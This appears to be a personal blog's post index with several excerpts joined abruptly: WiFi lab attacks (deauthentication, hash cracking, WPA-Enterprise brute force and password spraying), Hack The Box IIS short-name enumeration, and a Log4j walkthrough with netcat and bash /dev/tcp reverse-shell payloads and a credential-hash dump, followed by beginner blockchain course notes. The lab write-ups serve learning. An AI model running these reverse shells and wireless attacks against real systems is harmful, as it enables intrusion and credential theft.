want to target for a deauthentication attack. To ensure effectiveness, we execute this attack on both clients simultaneously. Since there are two access points (APs), the attack needs to target both of them. This is because disconnecting a client from one AP might cause it to reconnect to the other, rather than connecting to our Rogue Access Point (RogueAP).\nusing the commands\niwconfig wlan0mon channel 44 aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40 in another shell airmon-ng start wlan1 iwconfig wlan1mon channel 44 aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan1mon -c 64:32:A8:07:6C:40 After performing a deauth attack on the client with address 64:32:A8:07:6C:40 using two different rogueAPs that we had setup, we were able to get the hash that we can crack t get the password as shown below.\nthe hash will be located in a logs directory under the eaphammer tool, where we can take it and get the hash alone using the syntax cat /root/tools/eaphammer/logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' \u0026gt;\u0026gt; hashcat.5500\ncat /root/tools/eaphammer/logs/hostapd-eaphammer.log Reads and outputs the contents of the Eaphammer log file . | grep hashcat Filters the output, keeping only lines that contain the word \u0026ldquo;hashcat\u0026rdquo; (likely lines containing extracted WPA hashes). | awk '{print $3}' Extracts the third column ($3) from each matching line. This column probably contains the actual WPA hash . \u0026gt;\u0026gt; hashcat.5500 Appends (\u0026gt;\u0026gt;) the extracted hashes to a file named hashcat.5500 . If hashcat.5500 does not exist, it is created. after we get the hash, we can now crack it using hashcat as shown below\nroot@WiFiChallengeLab:~/VICTOR/captures# hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force after a while we have our password as shown below.\nGot stuck to access the website will look into it further later on.\n19. What is CONTOSO\\test flag on the wifi-corp AP website? # In this challenge, we already know the username, so we perform a brute force attack using the rockyou wordlist. To achieve this, we utilize a tool called air-hammer . It’s crucial to note that having the domain information is essential for this attack to work effectively. First we shall put our user in a text file and perform the bruteforce attack as shown below.\necho \u0026#39;CONTOSO\\test\u0026#39; \u0026gt; test.user ./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user ./air-hammer.py :\nThis runs the air-hammer script, a tool used for performing brute-force attacks on WPA/WPA2 Enterprise networks.\ni wlan3 :\nSpecifies the wireless network interface to be used for the attack. In this case, wlan3 is the interface where the attack will be executed. Ensure this interface supports monitor mode.\ne wifi-corp :\nIndicates the target network\u0026rsquo;s ESSID (Extended Service Set Identifier), which is the name of the Wi-Fi network you\u0026rsquo;re attacking. Here, the target network is wifi-corp.\np ~/rockyou-top100000.txt :\nSpecifies the path to the password list file (wordlist) used for brute-forcing. In this case, it points to rockyou-top100000.txt, a subset of the popular rockyou wordlist containing the top 100,000 most common passwords.\nu test.user :\nProvides the username for the attack. Here, the username is test.user, which is necessary since the attack targets WPA/WPA2 Enterprise networks that rely on usernames and passwords for authentication.\nwith the password we have found we can now create a config file that we can use to connect to the network in order for us to access the webpage and get our flag.\nHere is the content of the config file\nnetwork={ ssid=\u0026#34;wifi-corp\u0026#34; scan_ssid=1 key_mgmt=WPA-EAP identity=\u0026#34;CONTOSO\\test\u0026#34; password=\u0026#34;PASSWORD\u0026#34; eap=PEAP phase1=\u0026#34;peaplabel=0\u0026#34; phase2=\u0026#34;auth=MSCHAPV2\u0026#34; } with that we are now provided with an IP address as shown below.\nafter accessing the webpage, I used the password and username of test to be able to get the flag.\n20. What is the flag for the user with pass 12345678 on the wifi-corp AP? # This challenge is similar to the previous one, however for this one we shall perform a password spray attack in order to get the user and get our flag. First we will have to customize our word-list as shown below then perform the password spray attack.\ncat ~/top-usernames-shortlist.txt | awk \u0026#39;{print \u0026#34;CONTOSO\\\\\u0026#34; $1}\u0026#39; \u0026gt; ~/top-usernames-shortlist-contoso.txt and now we shall perform the password spray attack\n./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt\nwe found our user as shown below.\nthen edited our previous config file to use to access the website and we got our flag after logging to the website with the user’s credentials\n","date":"6 January 2025","externalUrl":null,"permalink":"/posts/wifi-hacking/","section":"Posts","summary":"Wireless Fidelity","title":"WIFI HaCKING","type":"posts"},{"content":"During the period of March 2025 to November 2025, I was honored to be among the 40 kamiLimu cohort 9 mentees, a rigorous and fun mentorship program where mediocrity is treated as a crisis and feedback taken as a love language (Do not say it is an 8 month structured mentorship program for tech students I warned you or else Dr. Chao will be on your neck).\nOver the eight months🤦🏼‍♂️(I had to), I got to participate in the mentorship\u0026rsquo;s competition on the following categories;\nPublic speaking Scholraship essay writing and presentation.

One thing that jumped out is the two directories in /dev, both of which look like md5hashes. Some quick guessing shows that they are actually md5 hashes of the two creators, md5(mrb3n) = 304c0c90fbc6520610abbf378e2339d1 and md5(eks) = dca66d38fd916317687e1390a420c3fc.\nIIS Shortnames # A key technique here is to exploit Windows\u0026rsquo; short file names, known as the 8.3 naming convention, which restricts each file name to eight characters followed by a dot and a three-character extension. There was an intriguing paper that explored how earlier versions of IIS and .NET handle these 8.3 file names. The method involves examining how the server deals with 8.3 names that include wildcards, which it appears to process when the tilde (~) symbol is present in the file path.\nDifferent servers may require different HTTP request methods to detect this behavior. On this particular server, the issue doesn’t appear with a GET request, but is exposed using an OPTIONS request. For instance, using gobuster, I found that there is a folder called templates in the root directory. When I send an OPTIONS request to http://10.13.38/11/t*~1*/.aspx, the server responds with a 404 error. However, when I send a request to http://10.13.38/11/c*~1*/.aspx, it responds with a 200 status code.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/c*~1*/.aspx\u0026#39; HTTP/1.1 200 OK Allow: OPTIONS, TRACE, GET, HEAD, POST Server: Microsoft-IIS/10.0 Public: OPTIONS, TRACE, GET, HEAD, POST Date: Mon, 07 Oct 2024 02:11:52 GMT Content-Length: 0 ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/t*~1*/.aspx\u0026#39; HTTP/1.1 404 Not Found Content-Type: text/html Server: Microsoft-IIS/10.0 Date: Mon, 07 Oct 2024 02:12:10 GMT Content-Length: 1245 I tried each character and got the next character to be s, as seen below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/ta*~1*/.aspx\u0026#39; HTTP/1.1 200 OK Allow: OPTIONS, TRACE, GET, HEAD, POST Server: Microsoft-IIS/10.0 Public: OPTIONS, TRACE, GET, HEAD, POST Date: Mon, 07 Oct 2024 02:14:08 GMT Content-Length: 0 ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/tem*~1*/.aspx\u0026#39; HTTP/1.1 404 Not Found Content-Type: text/html Server: Microsoft-IIS/10.0 Date: Mon, 07 Oct 2024 02:14:15 GMT Content-Length: 1245 However, this does not work for all directories / files.

I found this article : https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi very interesting. CVE-2021–44228\nTask 5 # What protocol does JNDI leverage in the injection?\nTask 6 # What tool do we use to intercept the traffic, indicating the attack was successful?\ntcpdump\nTask 7 # What port do we need to inspect intercepted traffic for?\nThe protocol use for injection is LDAP, so the port to inspect is the default port of LDAP which is 389. Task 8 # What port is the MongoDB service running on?\nThe mongoDB service is an internal process. We first try to take the control of the machine by exploiting the CVE : CVE-2021–44228.\nFirst step is to download a tool that will help us to exploit the previous vulnerabilities.\nwget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar Once the tool is download, use the following code to open an LDAP server on your attack box. Note that you have to change the IP address by yours\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;nc IP_ADDRESS PORT -e /bin/sh\u0026#34; -A \u0026#34;IP_ADDRESS\u0026#34; The output will be similar to this\nThe second step is to open a netcat listener in our attack box. 4444 here is my chosen port.\nnc -lvp 4444 The third step is to intercept a login request with burpsuite and tamper with it, By adding our payload. Replace the URL with the one which is return in the previous step\nWhen we send out request we got an error\nBefore we continue it is important to know if the error it is not because the application is not vulnerable. To verify that, we will use tcpdump to intercept traffic and verify if there is an initiated connection when the previous request is sent.\nStart tcpdump with this command\nsudo tcpdump -i tun0 port 1389 Then re-send the request, and you will have output like this. Mean that application is vulnerable to jndi injection, but we have to build a better payload.\nTo build our payload, we will need maven and open-jdk, in my computer it is installed by default if it is not the case for you, install it.\nClone and build the project with this command line\ngit clone https://github.com/veracode-research/rogue-jndi \u0026amp;\u0026amp; cd rogue-jndi \u0026amp;\u0026amp; mvn package Then, encode to base64 the command we want to inject. Change the IP_ADDRESS by your attack box and PORT by the port you want (it has to be free).\necho \u0026#39;bash -c bash -i \u0026gt;\u0026amp;/dev/tcp/IP_ADDRESS/PORT 0\u0026gt;\u0026amp;1\u0026#39; | base64 Copy the output, it will help in the following\nAfter this, we launch an LDAP server on our attack box. Change the IP_ADDRESS by yours and the base64 code by the previous output\njava -jar rogue-jndi/target/RogueJndi-1.1.jar --command \u0026#34;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMjM0LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}\u0026#34; --hostname \u0026#34;IP_ADDRESS\u0026#34; We have now to open a listener on a port, we previously choose\nThen, we intercept a login request with burpsuite and add our payload\nSend the request and back to your listener, you are now connected to the victim machine\nOnce connected, we can upgrade the shell to be more interactive\nscript /dev/null -c bash We use the ps -aux command to know processes running\n!\nAnd there is mongodb at the port 27117\nTask 9 # What is the default database name for UniFi applications?\nConnect to mongo db and list databases\nmongo --port 27117 show dbs Task 10 # What is the function we use to enumerate users within the database in MongoDB?\ndb.admin.find() Task 11 # What is the function we use to update users within the database in MongoDB?\ndb.admin.update() Task 12 # What is the password for the root user?\nUse this command to dump all the passwords in the database :\nunifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34; \u0026lt;17 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34; MongoDB shell version v3.6.3 connecting to: mongodb://127.0.0.1:27117/ace MongoDB server version: 3.6.3 { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;61ce278f46e0fb0012d47ee4\u0026#34;), \u0026#34;name\u0026#34; : \u0026#34;administrator\u0026#34;, \u0026#34;email\u0026#34; : \u0026#34;administrator@unified.htb\u0026#34;, \u0026#34;x_shadow\u0026#34; : \u0026#34;$6$nCiz.BUHQGQ8KpZv$pRaZabdm03bPBxVyaG6OKs/dmMASG6DxTC30/IceWjGVeXtBbYshFjuAGOJOJcEQhE4.4x0ETwCS/92wsa7W51\u0026#34;, There is an administrator user, in the x_shadow file it is an SHA-512 hash of the password, you can try to crack it but it nos possible.

The Bitcoin Whitepaper, authored by the pseudonymous\nSatoshi Nakamoto , described how Bitcoin could facilitate peer-to-peer transactions within a decentralized network using cryptography. This gave rise to censorship-resistant finance and presented\nBitcoin as a superior digital store of value, often referred to as\ndigital gold\n. There is a fixed amount of Bitcoin, similar to the scarcity of gold. You can learn more about this in the\nBitcoin Whitepaper\n.\nEthereum and Smart Contracts # A few years after Bitcoin\u0026rsquo;s creation, Vitalik Buterin and others founded\nEthereum , which builds upon the blockchain infrastructure, but with additional capabilities. With Ethereum, you can create decentralized transactions, organizations, and agreements without a centralized intermediary. This was achieved through the addition of\nsmart contracts .\nThough the concept of smart contracts was originally conceived in 1994 by\nNick Szabo\n, Ethereum made it a reality.\nSmart contracts are a set of instructions executed in a decentralized way without the need for a centralized or third party intermediary.\nSmart Contract functionality is the primary difference between blockchains like\nEthereum and\nBitcoin . Technically\nBitcoin does have smart contracts but they\u0026rsquo;re intentionally\nturing incomplete .\nThe Oracle Problem # However, smart contracts face a significant limitation – they cannot interact with or access data from the real world. This is known as the\nOracle Problem .\nBlockchains are deterministic systems, so everything happens within their ecosystem. To make smart contracts more useful and capable of handling real-world data, they need external data and computation.\nOracles serve this purpose. They are devices or services that provide data to blockchains or run external computation. To maintain decentralization, it\u0026rsquo;s necessary to use a decentralized Oracle network rather than relying on a single source. This combination of on-chain logic with off-chain data leads to\nhybrid smart contracts .\nNote:\nChainlink # Chainlink\nis a popular decentralized Oracle network that enables smart contracts to access external data and computation. Chainlink is also blockchain agnostic - so it\u0026rsquo;s going to work with any chain out there.\nLayer 2 Scaling Solutions # As blockchains grow, they face scaling issues. Layer 2, or L2, solutions have been developed to address this. L2 solutions involve other blockchains hooking into the main blockchain, essentially allowing it to scale. There are two primary types of L2 solutions:\nOptimistic Rollups: eg. Optimism, Arbitrum Zero-Knowledge Rollups: eg. ZK Sync, Polygon ZK EVM Don\u0026rsquo;t worry too much about this now. Once we understand how blockchains work \u0026lsquo;under the hood\u0026rsquo;, we\u0026rsquo;ll go further into Layer 2\u0026rsquo;s then.\nTerminology # You\u0026rsquo;re going to hear some terms used in this course (and the community as a whole) a little interchangeably. Maybe you haven\u0026rsquo;t heard these terms before. I hope this offers a bit of clarification.\nCommon Terms Blockchain: In web3, a blockchain is a digital ledger that records transactions across many computers in a secure and decentralized manner. Each block contains a number of transactions, and every new block is linked to the previous one, forming a chain. This makes the data tamper-resistant. Example: Bitcoin\u0026rsquo;s blockchain records all BTC transactions. Oracle: Oracles in web3 are intermediaries that provide smart contracts with external data. They act as bridges between blockchains and the outside world, allowing smart contracts to execute based on real-world events and data. Example: A weather oracle provides data for a smart contract that triggers crop insurance payments based on rainfall data. Layer 2: Layer 2 solutions in web3 are technologies built on top of a blockchain (Layer 1) to improve its scalability and efficiency. These solutions handle transactions off the main chain, reducing congestion and fees, and then settle the final state on the main chain. Example: The Lightning Network for Bitcoin. Dapp (Decentralized Application): A Dapp is an application that runs on a decentralized network, typically a blockchain. It is powered by smart contracts and operates without a central authority. Dapps can serve various purposes, from finance to gaming. Example: Uniswap, a decentralized finance application. Smart Contract: In web3, a smart contract is a self-executing contract with the terms of the agreement directly written into code. They run on blockchains and automatically execute when predetermined conditions are met, without the need for intermediaries. Example: A smart contract for an escrow service. Hybrid Smart Contract: Hybrid smart contracts combine on-chain code (running on a blockchain) with off-chain data and computations provided by oracles. This allows the contracts to interact with data and systems outside their native blockchain. Example: A smart contract for insurance that uses real-world data (like weather or flight delays) provided by oracles. Ethereum/EVM (Ethereum Virtual Machine): Ethereum is a blockchain platform known for its smart contract functionality. The Ethereum Virtual Machine (EVM) is its computation engine that executes smart contracts. Ethereum allows developers to build decentralized applications and is the basis for many web3 projects. Example: ERC-20 tokens, a standard for creating fungible tokens on Ethereum. Web3 # Web3 is a term used to describe the new paradigm of the internet powered by blockchain and smart contracts. Unlike the previous versions of the web, web3 is permissionless and relies on decentralized networks rather than centralized servers. This ushers in an era of censorship-resistant and transparent agreements and transactions, often called an ownership economy.\nWeb1:\nThe permissionless open sources web with static content\nWeb2:\nThe permissioned web, with dynamic content where companies run your agreements on their servers.\nWeb3:\nThe permissionless web with dynamic content.\nDecentralized censorship reesistant networks run your agreemeent and code. User owned ecosystems where one owns a portion of the protocol they interact with - instead of solely being the product Wrap Up # We\u0026rsquo;ve taken a high-level view of the blockchain landscape, including its history and the problems that smart contracts solve.\nAt this point you might be asking yourself\nwhat do these smart contracts really mean?\nor\nwhat is meant by trust minimized agreements/unbreakable promises?\nIn my mind a technology is really only as good as the problem it solves. So next, we\u0026rsquo;re going to look at what the\npurpose\nof\nsmart contracts is - what\u0026rsquo;s the value proposition exactly?\nPurpose of smart contracts # The Essence of Blockchain and Smart Contracts # Almost every interaction or transaction in our lives involves some form of agreement or contract. For instance, purchasing a chair involves a contract to buy lumber, assemble it, and sell the finished product. Your electricity supply is also based on an agreement between you and the electric company. When you get an oil change for your car, you\u0026rsquo;re promised a service in exchange for money.\nAlmost everything we do in modern life relates to an agreement or contract in some way.\nTo make it more relatable, think of contracts and agreements as promises. Traditional contracts, however, require trust between parties, and this doesn’t always work in favor of honesty and fairness.\nThe Problem with Traditional Agreements # Lets consider some real world examples of where trust leverages agreements can go wrong and why blockchain technology and smart contracts mitigates these risks.\nConsumer Trust # In the 80s and 90s, McDonald’s Monopoly game promised customers a chance to win money through game cards obtained with purchases. However, it turned out that the game was rigged by insiders who manipulated the system for their gain. Essentially, McDonald’s failed to keep its promise.\nThis example demonstrates that relying on trust within agreements can lead to fraudulent activities and broken promises.\nWith smart contracts, we can eliminate the need for trust. A smart contract is an agreement or a set of instructions that are deployed on a decentralized blockchain. Once deployed, it cannot be altered, it automatically executes, and everyone can see its terms.\nImagine if McDonald’s Monopoly game was operated on a blockchain through a smart contract. The fraudulent activities would have been impossible due to the immutable, decentralized, and transparent nature of smart contracts.\nBanking and Trust # Traditional banks have sometimes failed to keep the promise of safeguarding people\u0026rsquo;s money, as seen during the Great Depression. Blockchain and smart contracts can ensure transparency and execute automated solvency checks, preventing the bank from becoming insolvent.\nThe core of blockchain and smart contracts lies in creating a trustless system where agreements are transparent, unchangeable, and executed without human intervention. This technology holds the potential to revolutionize industries and everyday agreements by ensuring honesty and fairness.\nFinancial Markets Access # Centralized bodies, like traditional exchanges, have the power to restrict access to financial markets. This was evident when Robinhood restricted trading on certain assets in 2021. With decentralized exchanges like Uniswap, there is no central authority that can alter or limit market access. This introduces fairness and openness to the financial markets.\nTo Summarize # Traditional Agreements: Require trust in a centralized entity. Smart Contracts: Transparent, decentralized, and tamper-proof. In a scenario where you have to choose, smart contracts are an obvious choice as they cannot be manipulated or altered in anyone\u0026rsquo;s favor.\nSmart contracts are\nthe\nsolution to minimizing the reliance on trust based systems that have historically failed us time and time again.\nUnder the Hood # Smart contracts are relatively new, but have already started transforming various markets. They do this by representing \u0026lsquo;promises\u0026rsquo; as code on the blockchain. This code is executed by a decentralized collective, such that no single entity can alter the agreemeent in any way! The agreement and it\u0026rsquo;s terms are public knowledge and will automatically execute without human intervention.\nMore industries are adopting smart contracts and blockchain due to the numerous advantages they offer. This results in trust-minimized agreements or what can be simply termed as unbreakable promises.\nBeyond Trust Minimization # It is important to note that blockchain, smart contracts, and cryptocurrencies are not just about trust-minimized agreements. They offer security benefits, uptime advantages, execution speed, and\nmuch more\n.\nCaution: Not All Are Equal # However, beware of platforms that claim to be decentralized but are not in practice. An example from 2022 is the\nSBF\u0026#39;s FTX platform . It presented itself as a Web3 platform, but was essentially a traditional Web2 company using cryptocurrency without the benefits of smart contracts.\nAs an emerging developer or user in this space, it\u0026rsquo;s important to discern between legitimate projects and those that aren\u0026rsquo;t contributing to the ethos of Web3. I want you to be successful, but I want you to be successful because you\u0026rsquo;re creating value. Platforms like\nFTX were pretending to bring value to the space and leeching value from it.\nWrap Up # What we\u0026rsquo;ve learnt is that traditional contracts or agreements between parties are almost always trust based. Trust based agreements come with inherent flaws and the potential of broken agreements, the conseequences of which we\u0026rsquo;ve seen throughout history - The Great Depression, Monopoly Lottery, Robin Hood etc.\nBlockchain technology and smart contracts solve these problems by introducing fairness, transparency and immutability to promises. These attributes of smart contracts assure that trust isn\u0026rsquo;t required and we can be certain that an agreement will be executed as described 100% of the time.\nLastly, it\u0026rsquo;s important to note that there are several actors, such as\nFTX which\npretend\nto embody the ideologies of Web3, but are really centralized entities looking to extract value from the system, be aware of these.\nCurrent smart contract landscape # Features of Smart Contracts # Smart contracts come with various features that distinguish them from traditional agreements.\nDecentralization # The first feature is decentralization; smart contracts do not rely on any centralized intermediary. Instead, they run on a blockchain which is maintained by thousands of individuals known as node operators. It\u0026rsquo;s the collective effort of these node operators running the smart contracts that make the network decentralized. This aspect will be discussed more in-depth later.\nTransparency and Flexibility # Transparency is inherent to blockchain networks. Since all node operators can see everything happening on-chain, there is no room for unfair or hidden deals. This transparency ensures that everyone has access to the same information and plays by the same rules.\nIt is important to note that this transparency does not necessarily compromise privacy. Blockchain is pseudo-anonymous, meaning that your transactions are not directly tied to your real-world identity.\nSpeed and Efficiency # Smart contracts and blockchain transactions are incredibly fast and efficient compared to traditional banking systems. For example, bank transfers, especially international ones, can take up to several weeks, whereas blockchain transactions happen almost instantly. This speed is not only convenient but also allows for more efficient interactions between parties.\nSecurity and Immutability # Once a smart contract is deployed, it cannot be altered or tampered with. This immutability ensures that the terms of the contract are set in stone. This is a stark contrast to centralized systems where a server or database can be hacked, and data can be altered. The decentralized nature of blockchain makes hacking nearly impossible since an attacker would have to take control of more than half the nodes, which is significantly more challenging than compromising a single centralized server.\nAdditionally, the data on a blockchain is resilient. In a traditional system, if your computer and backups fail, you lose all your data. In contrast, in a blockchain, your data is replicated across thousands of nodes. Even if several nodes were to go down, your data would remain secure as long as there is at least one copy of the blockchain.\nElimination of Counterparty Risk # Smart contracts eliminate the need for trust in transactions. Once a smart contract is deployed, its terms cannot be changed. This means that parties cannot alter the agreement based on greed or any other factors. This ensures that the agreement is enforced as originally intended.\nIn traditional systems, there is always a risk that the other party might not fulfill their end of the bargain. With smart contracts, this risk is eliminated, and agreements are enforced programmatically.\nApplications of Smart Contracts # Smart contracts have given rise to new industries and revolutionized existing ones.\nDecentralized Finance (DeFi) # DeFi, or Decentralized Finance, allows users to engage with financial markets without relying on centralized intermediaries. With smart contracts, users have transparent access to financial markets and can engage with sophisticated financial products efficiently and securely. We will provide practical examples of how to build and interact with DeFi protocols in upcoming lessons.\nDecentralized Autonomous Organizations (DAOs) # DAOs are governed entirely by smart contracts and operate in a decentralized manner. This structure offers benefits such as transparent governance, efficient engagement, and clear rules. DAOs are an evolution in politics and governance, and we will cover how to build and work with DAOs in future lessons.\nNon-Fungible Tokens (NFTs) # NFTs, or Non-Fungible Tokens, can be thought of as digital art or unique assets. NFTs have created new avenues for artists and creators to monetize their work. We will also cover how to create and interact with NFTs in this course.\nOther Applications # And then, maybe\nyou\u0026rsquo;ll\nbe the one to discover the next iteration of smart contract applications!\nHow Blockchains work # In this lesson, we\u0026rsquo;re going to break down blockchains, the process and the technology itself using a widely-praised and accessible demo available\nhere\n.\nUnderstanding Hash Functions # At its simplest, a hash is a unique, fixed-length string that serves to identify any piece of data. When you input any kind of data into a hash function, it produces a hash. In this demo, the hash algorithm we\u0026rsquo;ll focus on is SHA-256.\nIf I add\nPatrick Collins to our\nSHA-256 algorithm, it will:\nConvert the letters to numbers Convert the numbers to a fixed-length “string” or “hash” Patrick Collins gets converted to\n7e5b5a1a6b80e2908b534dd5728a998173d502469c37121dd63fca283068077c Ethereum, uses its own version of a hashing algorithm (Keccak256)that isn\u0026rsquo;t exactly SHA-256 but belongs to the SHA family. This doesn\u0026rsquo;t change things significantly here as we\u0026rsquo;re primarily concentrating on the concept of hashing.\nIn the application, whatever data you enter into the data section, undergoes processing by the SHA-256 hash algorithm resulting in a unique hash.\nFor example, when I input my name as \u0026ldquo;Patrick Collins,\u0026rdquo; the resulting hash uniquely represents \u0026ldquo;Patrick Collins.\u0026rdquo; The fascinating aspect is, no matter how much data is input, the length of the generated hash string remains constant.\nUnderstanding Blocks # Now that we\u0026rsquo;ve grasped the concept of hashing and fixed-length string, let\u0026rsquo;s inspect the structure of a blockchain—a collection of \u0026ldquo;blocks.\u0026rdquo;\nA block takes the same data input, but instead of a singular data field, a block is divided into \u0026lsquo;block\u0026rsquo;, \u0026rsquo;nonce\u0026rsquo;, and \u0026lsquo;data.\u0026rsquo; All three are then run through the hash algorithm, producing the hash for that block. As a result, even a minor change in the data leads to an entirely different hash, hence, invalidating the block.\nIn essence, mining involves the computational trial and error process of finding an acceptable value to produce a hash which typically follows a certain pattern, such as starting with four zeros. The value found, which satisfies this criterion, is known as the \u0026rsquo;nonce\u0026rsquo;.\nThe problem or criteria a miner has to solve will vary from blockchain to blockchain, but the concept is the same.\nThe Inherent Beauty of Blockchain: Immutability # In a blockchain, which is essentially a sequence of blocks, each block is comprised of the previous elements - a block number, a nonce and data - as well as\nthe hash of the previous block What this means in practice is that any changes to data, in any block of the chain, will invalidate every proceeding block, until they are recalculated, or re-mined.\nGenesis Block:\nDecentralized Distribution # Now, if a single entity were to control the blockchain, they could conceivably change any data they want, and then re-mine, or re-validate subsequent blocks. This is bad.\nEnter Decentralized Distribution.\nThe crux of blockchain\u0026rsquo;s power lies in its decentralization or distributed nature. Under this system, multiple entities or \u0026ldquo;peers\u0026rdquo; run the blockchain technology, each holding equal weight and power. In the event of disparity between the blockchains run by different peers (due to tampering or otherwise), the majority hash wins, as the majority of the network agrees on it.\nNodes that don\u0026rsquo;t agree with the majority effectively fork the network, continuing on their own with their own history.\nInterplay of Blockchain \u0026amp; Transactions # Until now we\u0026rsquo;ve been considering the data passed in a block to be a random string of text, but the reality is - this data can be anything. In the token and coinbase sections of this demo you can see how each block is comprised of a number of transactions that all get hashed together. Any edits to any of these transactions is going to invalidate the chain!\nWrap Up # To summarize, every transaction, block, and indeed the whole blockchain itself comes down to understanding the concept of a hash—this unique fixed-length string that is intrinsically linked with the original data. We\u0026rsquo;ve also underscored the importance of decentralization and highlighted how the concept of immutability plays into the system\u0026rsquo;s security.\nNB:\nA nonce- is a “number used once” to find the “solution” to the blockchain problem.\nA Block - is a list of transactions mined together\nMining - Process of finding the “solution” to the blockchain “problem”\nBlockchain overview # Preface # I\u0026rsquo;ll start by saying, you\u0026rsquo;ve done great getting his far, if at first some of these concepts are hard to grasp, things will get better with experience as we move through the course and you\u0026rsquo;re exposed to real world examples.\nI definitely would recommend going back and reviewing the parts that you don\u0026rsquo;t quite get and asking questions in the\ndiscussions tab\nof the GitHub repository.\nNow that we know all the cryptography pieces, how the blockchain actually works, how our signatures work and how everything sticks together, let\u0026rsquo;s talk a little bit about how this works in actuality and what\u0026rsquo;s really going on.\nIt\u0026rsquo;s important to note that many of the concepts we\u0026rsquo;ve covered and will cover are going to pertain to Ethereum, or the EVM ecosystem. Each specific blockchain however, may have their own nuances and intricies to watch out for. Trust that the overarching concepts will all be the same, but keep an eye out for the specific criteria that may very from chain to chain, how blocktime is handled, or which hashing algorithm is used for example.\nTraditional Networks vs Blockchain # Traditionally, when you run an application be it a website or something that connects to a server you are interacting with a centralized entity. This is the opposite of what you may recall from our distributed blockchain example, in that the server is controlled and run by a single centralized group.\nBlockchains, as we saw, run on a network of independent nodes. In our previous example, each of the\nPeers was representative of an independent\nnode operator. The term\nnode typically refers to a single instance of a decentralized system, Peer A would be a\nnode . This network, this combination of these nodes interacting with each other is what creates a blockchain. What makes these networks so potent, is that anybody can join. All anyone needs is a little bit a hardward and you can participate in securing a blockchain network. You could go to GitHub and start operating a node in a few seconds!\nIn the traditional world applications are run by centralized entities and if that entity goes down or is malicious or decides that they want to shut off - they just can. They\u0026rsquo;re the ones that control everything.\nBlockchains, by contrast, don\u0026rsquo;t have this problem. If one node or one entity that runs several nodes goes down, since there are so many other independent nodes running, it doesn\u0026rsquo;t matter, the blockchain and the system will persist so long as there is at least one node always running. Luckily for us, the most popular chains like Bitcoin and ethereum have thousands and thousands of nodes. Malicious nodes are kicked from the network, or even punished in some cases. Majority rules when it comes to the blockchain.\nThis gives blockchains this incredibly potent immutability trait where nothing can be changed or corrupted so in essence we can think of a blockchain as a decentralized database. In the case of Ethereum it has an extra additional feature where it also can do computation in a decentralized manner now.\nConsensus # Let\u0026rsquo;s talk consensus. This includes\nProof of Work and\nProof of Stake . You\u0026rsquo;ve probably heard these terms before and they\u0026rsquo;re really important to how these blockchains work.\nThe\nmining feature of our previous blockchain example was an example of\nProof of Work Proof of Work and\nProof of Stake fall under this umbrella of\nconsensus and\nconsensus is a really important topic when it comes to blockchains.\nConsensus\nVery roughly, a consensus protocol in a blockchain or decentralized system can be broken down into two pieces a chain selection algorithm and a sybil resistance mechanism. Mining, or Proof of Work, is a sybil resistance mechanism. This is what Bitcoin currently uses.\nProof of Work is known as a sybil resistance mechanism because it defines a way to figure out who is the block author or which node did the work to mine a block. Sybil resistance is a blockchain\u0026rsquo;s ability to defend against users creating a large number of pseudo-anonymous identities to gain a disproportionately advantageous influence over said system.\nAs mentioned, there are two primary types of sybil resistance:\nProof of Work Proof of Stake We\u0026rsquo;ll look a little closer at\nProof of Work first.\nProof of Work # Proof of work is a system of sybil resistance used in many blockchains, in its essence a miner needs to go through a very computationally heavy process (mining) to find the block\u0026rsquo;s answer. As a result, it doesn\u0026rsquo;t matter how many additional nodes you\u0026rsquo;re running, each node is obligated to do this work in order to receive a reward. The playing field is kept fair.\nNote:\nProof of Work needs to be combined with a\nchain selection rule to create\nconsensus .\nA\nchain selection rule is implemented as a means to determine which blockchain is the\nreal\nblockchain. Bitcoin (and prior to the merge, Ethereum), both use something called\nNakomoto Consensus . This is a combination of Proof of Work (Etherum has since switched to Proof of Stake) and the\nlongest chain rule .\nIn the\nlongest chain rule , the decentralized network decides that whichever chain has the most number of blocks will be the valid, or\nreal\nblockchain. When we saw\nblock confirmations in Etherscan earlier, this was representing the number of blocks ahead of our transaction in the longest chain.\nYou\u0026rsquo;ll sometimes hear people use\nProof of Work\nand\nProof of Work also serves as a means to determine who receives transaction fees as we discussed earlier. These transaction fees are paid by whomever initiates the transaction. In a Proof of Work system, every node is competing against eachother to solve the block problem first. The first node to solve the problem gets paid the transaction fees accumulated in the block they mine. In addition to this, miners are also paid a\nblock reward , the\nblock reward is given by the blockchain itself.\nIf you\u0026rsquo;ve previously heard of the Bitcoin Halving - this is the concept of the block reward being cut in half roughly every 4 years.\nBlock rewards are in the blockchains native currency - Bitcoin = BTC, Ethereum = ETH. This effectively increases the amount of that cryptocurrency in circulation.\nBlockchain Attacks # There are two major types of attacks that exist in the blockchain space.\nSybil Attack - When a user creates a number of pseudo-anonymous accounts to try to influence a network. 51% attack - Occurs when a single entity possesses both the longest chain and majority network control. This would allow the entity to fork the chain and bring the network onto the entities record of events, effectively allowing them to validate anything. Blockchains are very democratic. The bigger a blockchain is, the more decentralized, the more 